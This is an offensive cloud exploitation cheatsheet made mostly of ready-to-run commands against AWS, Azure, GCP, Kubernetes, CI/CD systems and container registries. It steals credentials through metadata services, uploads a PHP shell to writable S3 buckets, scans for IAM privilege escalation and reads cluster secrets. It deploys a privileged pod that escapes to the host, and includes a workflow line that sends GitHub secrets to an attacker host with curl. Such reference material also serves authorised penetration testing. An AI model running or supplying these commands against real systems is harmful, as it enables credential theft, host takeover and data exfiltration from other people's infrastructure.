# Cloud Exploitation Cheatsheet

## AWS

### Metadata Service (SSRF → Credentials)
```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (token required)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data (often contains secrets/startup scripts)
curl http://169.254.169.254/latest/user-data
```

### S3 Bucket Exploitation
```bash
# Public bucket enumeration
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 cp s3://BUCKET_NAME/secret.txt . --no-sign-request

# Bucket brute force
# Common patterns: company-backup, company-dev, company-logs, company-assets
aws s3 ls s3://TARGET-backup --no-sign-request 2>&1

# Writable bucket
aws s3 cp shell.php s3://BUCKET_NAME/ --no-sign-request

# ACL misconfiguration
aws s3api get-bucket-acl --bucket BUCKET_NAME --no-sign-request
```

### IAM Enumeration (with creds)
```bash
# Who am I
aws sts get-caller-identity

# List policies
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam get-policy-version --policy-arn ARN --version-id v1

# Enumerate permissions (automated)
# → enumerate-iam.py
python3 enumerate-iam.py --access-key KEY --secret-key SECRET

# Privilege escalation paths (Pacu)
pacu
> import_keys KEY SECRET
> run iam__enum_permissions
> run iam__privesc_scan
```

### Lambda / Serverless
```bash
# List functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNC_NAME
# Download URL in response → source code

# Environment variables (often contain secrets)
aws lambda get-function-configuration --function-name FUNC_NAME | jq '.Environment'

# Invoke function
aws lambda invoke --function-name FUNC_NAME output.json
```

### Common AWS Escalation Paths
```
# iam:PassRole + lambda:CreateFunction → create lambda with admin role
# iam:PassRole + ec2:RunInstances → launch instance with admin role
# iam:CreatePolicyVersion → create new policy version with admin
# iam:AttachUserPolicy → attach AdministratorAccess
# iam:PutUserPolicy → create inline admin policy
# sts:AssumeRole → assume more privileged role
# ssm:SendCommand → run commands on EC2 instances
```

---

## Azure

### Metadata Service
```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Azure AD Enumeration
```bash
# AADInternals (PowerShell)
Import-Module AADInternals
Get-AADIntLoginInformation -Domain TARGET.com
Get-AADIntTenantID -Domain TARGET.com

# ROADtools
roadrecon auth -u user@target.com -p password
roadrecon gather
roadrecon gui

# AzureHound (BloodHound for Azure)
azurehound -u user@target.com -p password
```

### Storage Account Exploitation
```bash
# Public blob enumeration
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"

# Shared Access Signature (SAS) token abuse
# If SAS token found → access resources with permissions encoded in token
# Check: se= (expiry), sp= (permissions: r=read, w=write, d=delete)
```

---

## GCP

### Metadata Service
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Service Account Key Exploitation
```bash
# If you find a service account key file (JSON):
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
gcloud compute instances list
gcloud iam service-accounts list
```

---

## Kubernetes

### From Inside a Pod
```bash
# Check if in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# API server access
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $KUBE_TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Check permissions
kubectl auth can-i --list  # what can this service account do?
kubectl auth can-i create pods  # specific check

# Pod escape paths
# 1. Privileged pod → mount host filesystem
# 2. hostPID/hostNetwork → access host processes/network
# 3. Service account with cluster-admin → full cluster access
# 4. Writable hostPath mount → modify host files
```

### Cluster Exploitation
```bash
# Enumerate
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces

# Read secrets
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | base64 -d

# Deploy malicious pod
kubectl run pwned --image=alpine --restart=Never --overrides='
{
  "spec": {
    "containers": [{
      "name": "pwned",
      "image": "alpine",
      "command": ["/bin/sh"],
      "stdin": true,
      "tty": true,
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
  }
}'
kubectl exec -it pwned -- chroot /host sh
```

---

## CI/CD Pipeline Exploitation

```bash
# GitHub Actions secrets
# If you can modify .github/workflows/ → exfiltrate secrets
# Workflow: echo ${{ secrets.AWS_SECRET_KEY }} | base64 | curl -d @- http://ATTACKER

# Jenkins
# /script → Groovy console (RCE)
# /credentials/ → stored credentials
println "id".execute().text

# GitLab CI
# CI/CD variables → Settings → CI/CD → Variables
# Runner tokens → can register malicious runner

# Terraform state files (often contain secrets)
# terraform.tfstate → search for passwords, keys, tokens
```

## Container Registry

```bash
# Docker Hub public images
docker pull TARGET/image:latest
# Inspect for secrets
docker history TARGET/image:latest --no-trunc
docker inspect TARGET/image:latest

# Private registry (unauthenticated)
curl http://REGISTRY:5000/v2/_catalog
curl http://REGISTRY:5000/v2/IMAGE/tags/list
curl http://REGISTRY:5000/v2/IMAGE/manifests/TAG
```
